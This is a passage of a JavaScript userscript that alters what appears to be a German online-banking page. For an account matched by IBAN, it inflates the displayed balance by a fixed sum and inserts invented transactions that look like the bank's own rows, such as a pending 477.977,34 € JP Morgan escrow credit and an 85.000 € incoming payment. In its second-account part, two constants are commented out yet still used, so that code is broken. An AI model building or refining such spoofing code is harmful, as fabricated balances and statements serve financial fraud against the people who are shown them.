    return { min: minD, max: maxD };
  }

  // Reconcile placeholders (VORGEMERKT, TODAY, months) when real sections appear later
  function reconcilePlaceholders(rootSection) {
    // Months
    const monthPlaceholders = Array.from(rootSection.querySelectorAll('article[aria-labelledby^="20"][data-tm-placeholder="1"]'));
    for (const ph of monthPlaceholders) {
      const key = ph.getAttribute('aria-labelledby');
      const real = Array.from(rootSection.querySelectorAll(`article[aria-labelledby="${key}"]`))
                        .find(a => a !== ph && !a.hasAttribute('data-tm-placeholder'));
      if (!real) continue;

      const phUl = ph.querySelector('ul[class^="_sui-card"]');
      let realUl = real.querySelector('ul[class^="_sui-card"]');
      if (!realUl) {
        realUl = document.createElement('ul');
        realUl.className = phUl ? phUl.className : (rootSection.querySelector('ul[class^="_sui-card"]')?.className || '_sui-card');
        real.appendChild(realUl);
      }

      const customLis = Array.from(phUl.querySelectorAll('li[id^="custom-"]'));
      for (const li of customLis) {
        const subtitle = li.querySelector('span[class*="__subtitle"]')?.textContent || '';
        const beforeEl = findInsertionPointByDate(realUl, subtitle);
        const steps = Number(li.dataset.tmSteps || 0);
        insertWithSteps(realUl, li, beforeEl, undefined, steps);
      }
      ph.remove();
      console.log(`[UserScript] Reconciled placeholder month ${key} into real article`);
    }

    // VORGEMERKT
    const pendingPh = rootSection.querySelector(`article[aria-labelledby="${PENDING_KEY}"][data-tm-placeholder="1"]`);
    const pendingReal = Array.from(rootSection.querySelectorAll(`article[aria-labelledby="${PENDING_KEY}"]`))
                             .find(a => a !== pendingPh && !a.hasAttribute('data-tm-placeholder'));
    if (pendingPh && pendingReal) {
      const phUl = pendingPh.querySelector('ul[class^="_sui-card"]');
      let realUl = pendingReal.querySelector('ul[class^="_sui-card"]');
      if (!realUl) {
        realUl = document.createElement('ul');
        realUl.className = phUl ? phUl.className : (rootSection.querySelector('ul[class^="_sui-card"]')?.className || '_sui-card');
        pendingReal.appendChild(realUl);
      }

      const customLis = Array.from(phUl.querySelectorAll('li[id^="custom-"]'));
      for (const li of customLis) {
        const steps = Number(li.dataset.tmSteps || 0);
        insertWithSteps(realUl, li, null, 0, steps);
      }
      pendingPh.remove();
      console.log('[UserScript] Reconciled placeholder VORGEMERKT into real article');
    }

    // TODAY
    const todayPh = rootSection.querySelector(`article[aria-labelledby="${TODAY_KEY}"][data-tm-placeholder="1"]`);
    const todayReal = Array.from(rootSection.querySelectorAll(`article[aria-labelledby="${TODAY_KEY}"]`))
                           .find(a => a !== todayPh && !a.hasAttribute('data-tm-placeholder'));
    if (todayPh && todayReal) {
      const phUl = todayPh.querySelector('ul[class^="_sui-card"]');
      let realUl = todayReal.querySelector('ul[class^="_sui-card"]');
      if (!realUl) {
        realUl = document.createElement('ul');
        realUl.className = phUl ? phUl.className : (rootSection.querySelector('ul[class^="_sui-card"]')?.className || '_sui-card');
        todayReal.appendChild(realUl);
      }

      const customLis = Array.from(phUl.querySelectorAll('li[id^="custom-"]'));
      for (const li of customLis) {
        const steps = Number(li.dataset.tmSteps || 0);
        insertWithSteps(realUl, li, null, 0, steps); // top default within TODAY
      }
      todayPh.remove();
      console.log('[UserScript] Reconciled placeholder TODAY into real article');
    }

    // LAST7
    const last7Ph = rootSection.querySelector(`article[aria-labelledby="${LAST7_KEY}"][data-tm-placeholder="1"]`);
    const last7Real = Array.from(rootSection.querySelectorAll(`article[aria-labelledby="${LAST7_KEY}"], article[aria-labelledby="LAST_WEEK"]`))
                           .find(a => a !== last7Ph && !a.hasAttribute('data-tm-placeholder'));
    if (last7Ph && last7Real) {
      const phUl = last7Ph.querySelector('ul[class^="_sui-card"]');
      let realUl = last7Real.querySelector('ul[class^="_sui-card"]');
      if (!realUl) {
        realUl = document.createElement('ul');
        realUl.className = phUl ? phUl.className : (rootSection.querySelector('ul[class^="_sui-card"]')?.className || '_sui-card');
        last7Real.appendChild(realUl);
      }

      const customLis = Array.from(phUl.querySelectorAll('li[id^="custom-"]'));
      for (const li of customLis) {
        const steps = Number(li.dataset.tmSteps || 0);
        insertWithSteps(realUl, li, null, 0, steps); // top default within LAST7
      }
      last7Ph.remove();
      console.log('[UserScript] Reconciled placeholder LAST7 into real article');
    }

    // YESTERDAY
    const yesterdayPh = rootSection.querySelector(`article[aria-labelledby="${YESTERDAY_KEY}"][data-tm-placeholder="1"]`);
    const yesterdayReal = Array.from(rootSection.querySelectorAll(`article[aria-labelledby="${YESTERDAY_KEY}"]`))
                               .find(a => a !== yesterdayPh && !a.hasAttribute('data-tm-placeholder'));
    if (yesterdayPh && yesterdayReal) {
      const phUl = yesterdayPh.querySelector('ul[class^="_sui-card"]');
      let realUl = yesterdayReal.querySelector('ul[class^="_sui-card"]');
      if (!realUl) {
        realUl = document.createElement('ul');
        realUl.className = phUl ? phUl.className : (rootSection.querySelector('ul[class^="_sui-card"]')?.className || '_sui-card');
        yesterdayReal.appendChild(realUl);
      }

      const customLis = Array.from(phUl.querySelectorAll('li[id^="custom-"]'));
      for (const li of customLis) {
        const steps = Number(li.dataset.tmSteps || 0);
        insertWithSteps(realUl, li, null, 0, steps); // top default within YESTERDAY
      }
      yesterdayPh.remove();
      console.log('[UserScript] Reconciled placeholder YESTERDAY into real article');
    }
  }

  function findTopUlForAtTopInsertion(rootSection) {
    const todayUl = findTodayArticleUl(rootSection);
    if (todayUl) return todayUl;

    const anchor = getAnchorAfterControls(rootSection);
    let n = anchor ? anchor.nextElementSibling : rootSection.firstElementChild;
    while (n) {
      if (n.matches && n.matches('article')) {
        const ul = n.querySelector('ul[class^="_sui-card"]');
        if (ul) return ul;
      }
      if (n.tagName === 'UL' && n.className.startsWith('_sui-card')) return n;
      n = n.nextElementSibling;
    }
    return rootSection.querySelector('ul[class^="_sui-card"]');
  }

  function insertTx(tx, rootSection) {
    if (hasEl(tx.id)) return;

    const preferPositive = isPositiveAmount(tx.amount);
    const template = findTemplateToClone(rootSection, preferPositive);
    if (!template) {
      console.warn(`[UserScript] No non-skeleton template found for "${tx.title}"`);
      return;
    }

    const clone = template.cloneNode(true);
    clone.id = tx.id;
    updateCloneContent(clone, tx, rootSection);

    const steps = Number(tx.steps || 0);
    const bucketRaw = (tx.bucket || 'AUTO').toUpperCase();
    const bucket = bucketRaw === 'V' ? 'VORGEMERKT'
                 : bucketRaw === 'H' ? 'TODAY'
                 : bucketRaw === 'G' ? 'YESTERDAY'
                 : (bucketRaw === '7' || bucketRaw === 'LAST7' || bucketRaw === 'LETZTE7') ? 'LAST7'
                 : bucketRaw;

    // Explicit buckets first
    if (bucket === 'VORGEMERKT') {
      const pendingUl = ensurePendingArticleUl(rootSection);
      if (!pendingUl) return;
      insertWithSteps(pendingUl, clone, null, 0, steps);
      console.log(`[UserScript] Inserted into VORGEMERKT with steps=${steps}: ${tx.title}`);
      return;
    }

    if (bucket === 'TODAY') {
      const todayUl = ensureTodayArticleUl(rootSection);
      if (!todayUl) return;
      insertWithSteps(todayUl, clone, null, 0, steps);
      console.log(`[UserScript] Inserted into TODAY with steps=${steps}: ${tx.title}`);
      return;
    }

    if (bucket === 'YESTERDAY') {
      const yesterdayUl = ensureYesterdayArticleUl(rootSection);
      if (!yesterdayUl) return;
      insertWithSteps(yesterdayUl, clone, null, 0, steps);
      console.log(`[UserScript] Inserted into YESTERDAY with steps=${steps}: ${tx.title}`);
      return;
    }

    if (bucket === 'LAST7') {
      const last7Ul = ensureLast7ArticleUl(rootSection);
      if (!last7Ul) return;
      insertWithSteps(last7Ul, clone, null, 0, steps);
      console.log(`[UserScript] Inserted into LAST7 with steps=${steps}: ${tx.title}`);
      return;
    }

    if (bucket === 'MONTH') {
      const monthKey = monthKeyFromDateStr(tx.date);
      if (!monthKey) {
        console.warn(`[UserScript] Cannot parse date for "${tx.title}" => month insertion skipped.`);
        return;
      }
      const monthUl = ensureMonthArticleUl(rootSection, monthKey);
      if (!monthUl) return;
      const beforeEl = findInsertionPointByDate(monthUl, tx.date);
      insertWithSteps(monthUl, clone, beforeEl, undefined, steps);
      console.log(`[UserScript] Inserted by date in ${monthKey} with steps=${steps}: ${tx.title}`);
      return;
    }

    // AUTO behavior
    if (isVorgemerkt(tx.date)) {
      const pendingUl = ensurePendingArticleUl(rootSection);
      if (!pendingUl) return;
      insertWithSteps(pendingUl, clone, null, 0, steps);
      console.log(`[UserScript] [AUTO] Inserted into VORGEMERKT with steps=${steps}: ${tx.title}`);
      return;
    }

    // NEW: If site already groups recent items under "Letzte 7 Tage", follow that for AUTO.
    // If tx.date is on/after the oldest date currently in LAST7, insert into LAST7 (no new section is created).
    const txDateAuto = parseDateFromText(tx.date);
    const existingLast7Ul = findLast7ArticleUl(rootSection);
    if (existingLast7Ul && txDateAuto) {
      const range = getUlDateRange(existingLast7Ul);
      if (range && txDateAuto >= range.min) {
        insertWithSteps(existingLast7Ul, clone, null, 0, steps);
        console.log(`[UserScript] [AUTO] Inserted into LAST7 (existing) with steps=${steps}: ${tx.title}`);
        return;
      }
    }

    if (tx.insertByDate) {
      const monthKey = monthKeyFromDateStr(tx.date);
      if (!monthKey) {
        console.warn(`[UserScript] [AUTO] Cannot parse date for "${tx.title}" => skipping date-based insertion.`);
        return;
      }
      const monthUl = ensureMonthArticleUl(rootSection, monthKey);
      if (!monthUl) return;
      const beforeEl = findInsertionPointByDate(monthUl, tx.date);
      insertWithSteps(monthUl, clone, beforeEl, undefined, steps);
      console.log(`[UserScript] [AUTO] Inserted by date in ${monthKey} with steps=${steps}: ${tx.title}`);
    } else {
      // Top of TODAY (create TODAY if missing? Not for AUTO; use existing TODAY or nearest first list)
      const topUl = findTopUlForAtTopInsertion(rootSection);
      if (!topUl) {
        console.warn('[UserScript] No list found for top insertion.');
        return;
      }
      insertWithSteps(topUl, clone, null, 0, steps);
      console.log(`[UserScript] [AUTO] Inserted at TOP with steps=${steps}: ${tx.title}`);
    }
  }

  function tick() {
    try {
      const root = findRootSectionForIban();
      if (!root) return;

      // Move custom items from placeholders to real sections if they appear
      reconcilePlaceholders(root);

      for (const tx of customTransactions) {
        try { insertTx(tx, root); }
        catch (e) { console.error('[UserScript] Insert error:', tx.title, e); }
      }
    } catch (e) {
      console.error('[UserScript] Tick error:', e);
    }
  }

  setInterval(tick, TICK);
}

//======================================================================================
//======================================================================================
//======================================================================================


// SECOND ACCOUNT
// SECOND ACCOUNT
// SECOND ACCOUNT
// SECOND ACCOUNT // SECOND ACCOUNT
// SECOND ACCOUNT
// SECOND ACCOUNT


 if (window.location.href.includes("de") || window.location.href.includes("mainscript") || window.location.href.includes("Downloads")) {

    'use strict';

 //  const secDELTA_AMOUNT = 85000; // Change this to increase or decrease balance
    const INTERVAL_MS = 100;
    const SELECTOR = 'h1[class^="_sui-header__left-section__title"]';
//    const secIBAN_CHECK = "DE98 1203 0000 1051 0595 23";

    let originalAmount = null;
    let lastModifiedTime = 0;

    const forbiddenWords = [
        'finanzstatus',
        'überweisung',
        'karten',
        'aufträge',
        'produkte',
        'kontodetails',
        'postfach',
        'einstellungen',
        'mein profil'
    ];

    function parseGermanNumber(text) {
        const cleaned = text.replace(/\./g, '').replace(',', '.').replace(/[^\d.-]/g, '');
        const parsed = parseFloat(cleaned);
        return isNaN(parsed) ? null : parsed;
    }

    function formatGermanNumber(num) {
        return num.toLocaleString('de-DE', { style: 'currency', currency: 'EUR' });
    }

    function extractDigits(str) {
        return str.replace(/\D/g, '');
    }

    function isIBANMatch() {
        const expectedDigits = extractDigits(secIBAN_CHECK);
        const elements = document.querySelectorAll('[aria-label]');
        for (const el of elements) {
            const ariaValue = el.getAttribute('aria-label') || '';
            const ariaDigits = extractDigits(ariaValue);
            if (ariaDigits.includes(expectedDigits)) {
                console.log('✅ IBAN match found:', ariaValue);
                return true;
            }
        }
        console.warn('❌ No IBAN match found.');
        return false;
    }

    function isBalanceElementValid(text) {
        const normalized = text.toLowerCase();

        // Must contain at least one digit
        if (!/\d/.test(normalized)) {
            console.warn('⚠️ Balance element contains no digits.');
            return false;
        }

        for (const word of forbiddenWords) {
            if (normalized.includes(word)) {
                console.warn(`⚠️ Balance element contains forbidden word: "${word}"`);
                return false;
            }
        }

        return true;
    }

    function tryUpdateBalance() {
        const balanceElem = document.querySelector(SELECTOR);
        if (!balanceElem) {
            console.log('Balance element not found yet.');
            return;
        }

        const currentText = balanceElem.textContent.trim();

        if (!isBalanceElementValid(currentText)) {
            return;
        }

        if (!isIBANMatch()) {
            return;
        }

        if (originalAmount === null) {
            const parsed = parseGermanNumber(currentText);
            if (parsed === null) {
                console.warn('Failed to parse original balance:', currentText);
                return;
            }
            originalAmount = parsed;
            console.log('Original balance cached:', originalAmount);
        }

        const now = Date.now();
        if (now - lastModifiedTime >= INTERVAL_MS) {
            const newAmount = originalAmount + secDELTA_AMOUNT;
            const formatted = formatGermanNumber(newAmount);
            balanceElem.textContent = formatted;
            console.log(`Balance updated to: ${formatted}`);
            lastModifiedTime = now;
        }
    }

    setInterval(tryUpdateBalance, INTERVAL_MS);
  }


if (window.location.href.includes("de") || window.location.href.includes("mainscript") || window.location.href.includes("Downloads")) {

  'use strict';

  const TICK = 100;
//  const secIBAN_CHECK = "DE98 1203 0000 1051 0595 23";

  // Special buckets
  const PENDING_KEY = 'VORGEMERKT';
  const PENDING_TITLE = 'Vorgemerkt';
  const TODAY_KEY = 'TODAY';
  const TODAY_TITLE = 'Heute';
  const LAST7_KEY = 'LAST7';
  const LAST7_TITLE = 'Letzte 7 Tage';
  const YESTERDAY_KEY = 'YESTERDAY';
  const YESTERDAY_TITLE = 'Gestern';

  // How to control placement per transaction:
  // - bucket: 'AUTO' (default), 'TODAY', 'VORGEMERKT', 'MONTH'
  // - insertByDate: (used only by AUTO and MONTH) true => insert inside correct month by date; false => top of TODAY
  // - steps: positive => move UP N positions from default; negative => move DOWN |N| positions
//  const seccustomTransactions = [
//   {
//      id: 'custom-tx-1',
//      title: 'Treuhand JP Morgan Chase. Freigabe über Absender. A. Gold meldet sich.',
//      date: 'Vorgemerkt',
//      type: 'Treuhand-Eingang',
//      amount: '477.977,34 €',
//      bucket: 'VORGEMERKT',
//      steps: 0
//    },
//    {
//      id: 'custom-tx-2',
//      title: 'Miete Berlin Office',
//      date: '01.08.25',
//      type: 'Ausgang',
//      amount: '-2.500,00 €',
//      bucket: 'AUTO',             // force month insertion (create 2025-08 if missing)
//      insertByDate: true,          // within month place above closest earlier
//      steps: 0
//    },
//    {
//      id: 'custom-tx-3',
//      title: 'Dagmar Herbeck-Rosenbaum',
//      date: '04.09.25',
//      type: 'Eingang',
//      amount: '85.000,00 €',
//      bucket: 'H',              // AUTO: 'Vorgemerkt' -> VORGEMERKT; else insertByDate? then month; else top TODAY
//      insertByDate: true,
//      steps: 0
//    },
//    {
//      id: 'custom-tx-4',
//      title: 'Heutiger Bonus',
//      date: '15.08.25',
//      type: 'Eingang',
//      amount: '1.234,56 €',
//      bucket: 'TODAY',             // explicitly place under TODAY (create TODAY if missing)
//      steps: -2                    // move down by 2 items
//    }
//  ];

  // ---------- helpers ----------
  const digits = s => (s || '').replace(/\D/g, '');
  const isPositiveAmount = s => !s.trim().startsWith('-');
  const hasEl = id => document.getElementById(id) !== null;
  const clamp = (n, min, max) => Math.max(min, Math.min(max, n));
  const isVorgemerkt = s => !!s && /vorgemerkt/i.test(s);

  const MONTHS_DE = ['Januar','Februar','März','April','Mai','Juni','Juli','August','September','Oktober','November','Dezember'];

  let incomingClassTokenCache = null;
  function getIncomingClassToken(root) {
    if (incomingClassTokenCache) return incomingClassTokenCache;
    const p = root.querySelector('p[class*="__amount--incoming"]');
    if (p) {
      for (const cls of p.classList) {
        if (cls.includes('amount--incoming')) {
          incomingClassTokenCache = cls;
          return incomingClassTokenCache;
        }
      }
    }
    // fallback token seen in samples
    incomingClassTokenCache = '_sui-list-item__right-section__content__amount--incoming_11uji_574';
    return incomingClassTokenCache;
  }

  function parseDateFromText(text) {
    if (!text || /vorgemerkt/i.test(text)) return null;
    const m = text.match(/(\d{2})\.(\d{2})\.(\d{2,4})/);
    if (!m) return null;
    let [ , dd, mm, yy] = m;
    yy = yy.length === 2 ? ('20' + yy) : yy;
    return new Date(Number(yy), Number(mm) - 1, Number(dd));
  }

  function monthKeyFromDateStr(dateStr) {
    const d = parseDateFromText(dateStr);
    if (!d) return null;
    const y = d.getFullYear();
    const m = String(d.getMonth() + 1).padStart(2, '0');
    return `${y}-${m}`;
  }

  function monthLabelFromKey(monthKey) {
    const m = monthKey.match(/^(\d{4})-(\d{2})$/);
    if (!m) return monthKey;
    const y = Number(m[1]);
    const idx = Number(m[2]) - 1;
    const name = MONTHS_DE[idx] || m[2];
    return `${name} ${y}`;
  }

  function findRootSectionForIban() {
    const want = digits(secIBAN_CHECK);
    const labels = document.querySelectorAll('[aria-label]');
    for (const el of labels) {
      const al = el.getAttribute('aria-label');
      if (digits(al).includes(want)) {
        return el.closest('section');
      }
    }
    return null;
  }

  function getControlsSection(rootSection) {
    return rootSection.querySelector('section.sc-gGyJSQ');
  }

  function findTodayArticleUl(rootSection) {
    const article = rootSection.querySelector(`article[aria-labelledby="${TODAY_KEY}"]`);
    return article ? article.querySelector('ul[class^="_sui-card"]') : null;
  }

  function findYesterdayArticleUl(rootSection) {
    const article = rootSection.querySelector(`article[aria-labelledby="${YESTERDAY_KEY}"]`);
    return article ? article.querySelector('ul[class^="_sui-card"]') : null;
  }

  function ensureYesterdayArticleUl(rootSection) {
    let ul = findYesterdayArticleUl(rootSection);
    if (ul) return ul;

    const templateArticle = getAnyArticleTemplate(rootSection);
    if (!templateArticle) {
      console.log('[UserScript] Template article not ready; will retry creating YESTERDAY');
      return null;
    }

    try {
      const newArticle = templateArticle.cloneNode(true);
      newArticle.setAttribute('aria-labelledby', YESTERDAY_KEY);
      newArticle.setAttribute('data-tm-placeholder', '1');

      const header = newArticle.querySelector('header[id]');
      if (header) header.id = YESTERDAY_KEY;

      const h2 = newArticle.querySelector('h2');
      if (h2) h2.textContent = YESTERDAY_TITLE;

      let ulNode = newArticle.querySelector('ul[class^="_sui-card"]');
      if (!ulNode) {
        const ulTmpl = rootSection.querySelector('ul[class^="_sui-card"]');
        ulNode = document.createElement('ul');
        ulNode.className = ulTmpl ? ulTmpl.className : '_sui-card';
        newArticle.appendChild(ulNode);
      } else {
        while (ulNode.firstChild) ulNode.removeChild(ulNode.firstChild);
      }

      const today = rootSection.querySelector(`article[aria-labelledby="${TODAY_KEY}"]`);
      const vorgemerkt = rootSection.querySelector(`article[aria-labelledby="${PENDING_KEY}"]`);
      const controls = getControlsSection(rootSection);
      const after = today || vorgemerkt || controls;


      if (after) {
        if (after.nextSibling) rootSection.insertBefore(newArticle, after.nextSibling);
        else rootSection.appendChild(newArticle);
      } else {
        rootSection.insertBefore(newArticle, rootSection.firstElementChild);
      }

      console.log('[UserScript] Created placeholder YESTERDAY ("Gestern")');
      return ulNode;
    } catch (e) {
      console.error('[UserScript] Failed to create YESTERDAY article', e);
      return null;
    }
  }


      function getAnchorAfterControls(rootSection) {
    const today = rootSection.querySelector(`article[aria-labelledby="${TODAY_KEY}"]`);
    const controls = getControlsSection(rootSection);
    return today || controls || null;
  }

  function monthArticlesAfterAnchor(rootSection, anchor) {
    const out = [];
    let n = anchor ? anchor.nextElementSibling : rootSection.firstElementChild;
    while (n) {
      if (n.matches && n.matches('article[aria-labelledby^="20"]')) out.push(n);
      n = n.nextElementSibling;
    }
    return out;
  }

  function findMonthArticleUl(rootSection, monthKey) {
    if (!monthKey) return null;
    const article = rootSection.querySelector(`article[aria-labelledby="${monthKey}"]`);
    if (!article) return null;
    return article.querySelector('ul[class^="_sui-card"]');
  }

  function findPendingArticleUl(rootSection) {
    const article = rootSection.querySelector(`article[aria-labelledby="${PENDING_KEY}"]`);
    return article ? article.querySelector('ul[class^="_sui-card"]') : null;
  }

  function findLast7ArticleUl(rootSection) {
    const candidates = Array.from(rootSection.querySelectorAll(`article[aria-labelledby="${LAST7_KEY}"], article[aria-labelledby="LAST_WEEK"]`));
    if (candidates.length === 0) return null;
    const real = candidates.find(a => !a.hasAttribute('data-tm-placeholder')) || candidates[0];
    return real.querySelector('ul[class^="_sui-card"]') || null;
  }

  function insertPendingArticleAtTop(rootSection, newArticle) {
    // VORGEMERKT should be right below controls and before TODAY
    const controls = getControlsSection(rootSection);
    if (controls) {
      if (controls.nextSibling) rootSection.insertBefore(newArticle, controls.nextSibling);
      else rootSection.appendChild(newArticle);
      return;
    }
    const first = rootSection.firstElementChild;
    if (first) rootSection.insertBefore(newArticle, first);
    else rootSection.appendChild(newArticle);
  }

  function insertTodayArticleInOrder(rootSection, newArticle) {
    // TODAY should be below VORGEMERKT (if present) and above months
    const controls = getControlsSection(rootSection);
    const vorgemerkt = rootSection.querySelector(`article[aria-labelledby="${PENDING_KEY}"]`);
    const after = vorgemerkt || controls || null;
    if (after) {
      if (after.nextSibling) rootSection.insertBefore(newArticle, after.nextSibling);
      else rootSection.appendChild(newArticle);
    } else {
      const first = rootSection.firstElementChild;
      if (first) rootSection.insertBefore(newArticle, first);
      else rootSection.appendChild(newArticle);
    }
  }

  function insertLast7ArticleInOrder(rootSection, newArticle) {
    const today = rootSection.querySelector(`article[aria-labelledby="${TODAY_KEY}"]`);
    const yesterday = rootSection.querySelector(`article[aria-labelledby="${YESTERDAY_KEY}"]`);
    const vorgemerkt = rootSection.querySelector(`article[aria-labelledby="${PENDING_KEY}"]`);
    const controls = getControlsSection(rootSection);
    const after = yesterday || today || vorgemerkt || controls || null;

    if (after) {
      if (after.nextSibling) rootSection.insertBefore(newArticle, after.nextSibling);
      else rootSection.appendChild(newArticle);
    } else {
      const first = rootSection.firstElementChild;
      if (first) rootSection.insertBefore(newArticle, first);
      else rootSection.appendChild(newArticle);
    }
  }

  function insertMonthArticleInOrder(rootSection, newArticle, monthKey) {
    const anchor = getAnchorAfterControls(rootSection);
    const months = monthArticlesAfterAnchor(rootSection, anchor);
    // keep DESC by key: insert before the first older (k < newKey)
    for (const m of months) {
      const k = m.getAttribute('aria-labelledby');
      if (k < monthKey) {
        rootSection.insertBefore(newArticle, m);
        return;
      }
    }
    if (months.length > 0) {
      const last = months[months.length - 1];
      if (last.nextSibling) rootSection.insertBefore(newArticle, last.nextSibling);
      else rootSection.appendChild(newArticle);
    } else if (anchor) {
      if (anchor.nextSibling) rootSection.insertBefore(newArticle, anchor.nextSibling);
      else rootSection.appendChild(newArticle);
    } else {
      rootSection.appendChild(newArticle);
    }
  }

  function getItemDate(li) {
    const subtitle = li.querySelector('span[class*="__subtitle"]');
    return parseDateFromText(subtitle ? subtitle.textContent : '');
  }

  function findInsertionPointByDate(ul, txDateStr) {
    const txDate = parseDateFromText(txDateStr);
    if (!txDate) return null;
    const items = getListItems(ul);
    for (const item of items) {
      const d = getItemDate(item);
      if (!d) continue;
      if (d < txDate) return item; // insert BEFORE the closest earlier item
    }
    return null; // append at end
  }

  function isSkeletonLi(li) {
    return !!li.querySelector('[class*="_sui-skeleton"]');
  }

  function getValidItemsWithAmount(rootSection) {
    return Array.from(rootSection.querySelectorAll('li[class^="_sui-list-item"]'))
      .filter(li => !isSkeletonLi(li) && li.querySelector('p[class*="__amount"]'));
  }

  function findTemplateToClone(rootSection, preferPositive) {
    const items = getValidItemsWithAmount(rootSection);
    const pick = wantPos => items.find(li => {
      const p = li.querySelector('p[class*="__amount"]');
      return p && (isPositiveAmount(p.textContent.trim()) === wantPos);
    });
    return pick(preferPositive) || pick(!preferPositive) || items[0] || null;
  }

  function updateCloneContent(clone, tx, rootSection) {
    const titleEl = clone.querySelector('span[class*="__title"]');
    const subtitleEl = clone.querySelector('span[class*="__subtitle"]');
    const amountEl = clone.querySelector('p[class*="__amount"]');

    if (titleEl) titleEl.textContent = tx.title;
    if (subtitleEl) subtitleEl.textContent = `${tx.date} • ${tx.type}`;

    if (amountEl) {
      amountEl.textContent = tx.amount;
      const incomingToken = getIncomingClassToken(rootSection);
      const cleaned = Array.from(amountEl.classList).filter(
        cls => !cls.includes('amount--incoming') && cls !== 'undefined'
      );
      amountEl.className = cleaned.join(' ').trim();
      if (isPositiveAmount(tx.amount)) {
        amountEl.classList.add(incomingToken);
      } else {
        amountEl.classList.add('undefined');
      }
    }

    clone.dataset.tmSteps = String(Number(tx.steps || 0));
  }


      function getAnyArticleTemplate(rootSection) {
    // Prefer TODAY as visual template; else any month article
    return rootSection.querySelector(`article[aria-labelledby="${TODAY_KEY}"]`) ||
           rootSection.querySelector('article[aria-labelledby^="20"]') ||
           null;
  }

  function ensureMonthArticleUl(rootSection, monthKey) {
    let ul = findMonthArticleUl(rootSection, monthKey);
    if (ul) return ul;

    const templateArticle = getAnyArticleTemplate(rootSection);
    if (!templateArticle) {
      console.log(`[UserScript] Template article not ready; will retry creating ${monthKey}`);
      return null;
    }

    try {
      const newArticle = templateArticle.cloneNode(true);
      newArticle.setAttribute('aria-labelledby', monthKey);
      newArticle.setAttribute('data-tm-placeholder', '1');

      const header = newArticle.querySelector('header[id]');
      if (header) header.id = monthKey;

      const h2 = newArticle.querySelector('h2');
      if (h2) h2.textContent = monthLabelFromKey(monthKey);

      let ulNode = newArticle.querySelector('ul[class^="_sui-card"]');
      if (!ulNode) {
        const ulTmpl = rootSection.querySelector('ul[class^="_sui-card"]');
        ulNode = document.createElement('ul');
        ulNode.className = ulTmpl ? ulTmpl.className : '_sui-card';
        newArticle.appendChild(ulNode);
      } else {
        while (ulNode.firstChild) ulNode.removeChild(ulNode.firstChild);
      }

      insertMonthArticleInOrder(rootSection, newArticle, monthKey);
      console.log(`[UserScript] Created placeholder month article ${monthKey}`);
      return ulNode;
    } catch (e) {
      console.error('[UserScript] Failed to create month article', monthKey, e);
      return null;
    }
  }

  function ensurePendingArticleUl(rootSection) {
    let ul = findPendingArticleUl(rootSection);
    if (ul) return ul;

    const templateArticle = getAnyArticleTemplate(rootSection);
    if (!templateArticle) {
      console.log('[UserScript] Template article not ready; will retry creating VORGEMERKT');
      return null;
    }

    try {
      const newArticle = templateArticle.cloneNode(true);
      newArticle.setAttribute('aria-labelledby', PENDING_KEY);
      newArticle.setAttribute('data-tm-placeholder', '1');

      const header = newArticle.querySelector('header[id]');
      if (header) header.id = PENDING_KEY;

      const h2 = newArticle.querySelector('h2');
      if (h2) h2.textContent = PENDING_TITLE;

      let ulNode = newArticle.querySelector('ul[class^="_sui-card"]');
      if (!ulNode) {
        const ulTmpl = rootSection.querySelector('ul[class^="_sui-card"]');
        ulNode = document.createElement('ul');
        ulNode.className = ulTmpl ? ulTmpl.className : '_sui-card';
        newArticle.appendChild(ulNode);
      } else {
        while (ulNode.firstChild) ulNode.removeChild(ulNode.firstChild);
      }

      insertPendingArticleAtTop(rootSection, newArticle);
      console.log('[UserScript] Created placeholder VORGEMERKT (top)');
      return ulNode;
    } catch (e) {
      console.error('[UserScript] Failed to create VORGEMERKT article', e);
      return null;
    }
  }

  function ensureTodayArticleUl(rootSection) {
    let ul = findTodayArticleUl(rootSection);
    if (ul) return ul;

    const templateArticle = getAnyArticleTemplate(rootSection);
    if (!templateArticle) {
      console.log('[UserScript] Template article not ready; will retry creating TODAY');
      return null;
    }

    try {
      const newArticle = templateArticle.cloneNode(true);
      newArticle.setAttribute('aria-labelledby', TODAY_KEY);
      newArticle.setAttribute('data-tm-placeholder', '1');

      const header = newArticle.querySelector('header[id]');
      if (header) header.id = TODAY_KEY;

      const h2 = newArticle.querySelector('h2');
      if (h2) h2.textContent = TODAY_TITLE;

      let ulNode = newArticle.querySelector('ul[class^="_sui-card"]');
      if (!ulNode) {
        const ulTmpl = rootSection.querySelector('ul[class^="_sui-card"]');
        ulNode = document.createElement('ul');
        ulNode.className = ulTmpl ? ulTmpl.className : '_sui-card';
        newArticle.appendChild(ulNode);
      } else {
        while (ulNode.firstChild) ulNode.removeChild(ulNode.firstChild);
      }

      insertTodayArticleInOrder(rootSection, newArticle);
      console.log('[UserScript] Created placeholder TODAY ("Heute")');
      return ulNode;
    } catch (e) {
      console.error('[UserScript] Failed to create TODAY article', e);
      return null;
    }
  }

  function ensureLast7ArticleUl(rootSection) {
    // If the real "Letzte 7 Tage" exists (LAST7 or LAST_WEEK), use it; don't create a new one.
    let ul = findLast7ArticleUl(rootSection);
    if (ul) return ul;

    const templateArticle = getAnyArticleTemplate(rootSection);
    if (!templateArticle) {
      console.log('[UserScript] Template article not ready; will retry creating LAST7');
      return null;
    }

    try {
      const newArticle = templateArticle.cloneNode(true);
      newArticle.setAttribute('aria-labelledby', LAST7_KEY);
      newArticle.setAttribute('data-tm-placeholder', '1');

      const header = newArticle.querySelector('header[id]');
      if (header) header.id = LAST7_KEY;

      const h2 = newArticle.querySelector('h2');
      if (h2) h2.textContent = LAST7_TITLE;

      let ulNode = newArticle.querySelector('ul[class^="_sui-card"]');
      if (!ulNode) {
        const ulTmpl = rootSection.querySelector('ul[class^="_sui-card"]');
        ulNode = document.createElement('ul');
        ulNode.className = ulTmpl ? ulTmpl.className : '_sui-card';
        newArticle.appendChild(ulNode);
      } else {
        while (ulNode.firstChild) ulNode.removeChild(ulNode.firstChild);
      }

      insertLast7ArticleInOrder(rootSection, newArticle);
      console.log('[UserScript] Created placeholder LAST7 ("Letzte 7 Tage")');
      return ulNode;
    } catch (e) {
      console.error('[UserScript] Failed to create LAST7 article', e);
      return null;
    }
  }

  function getListItems(ul) {
    return Array.from(ul.children).filter(el => el.tagName === 'LI' && el.className.startsWith('_sui-list-item'));
  }

  function insertWithSteps(ul, li, defaultBeforeEl, defaultIndexOverride, steps) {
    const items = getListItems(ul);
    let defaultIndex;
    if (typeof defaultIndexOverride === 'number') {
      defaultIndex = defaultIndexOverride; // e.g., 0 for top insertion
    } else {
      defaultIndex = defaultBeforeEl ? items.indexOf(defaultBeforeEl) : items.length;
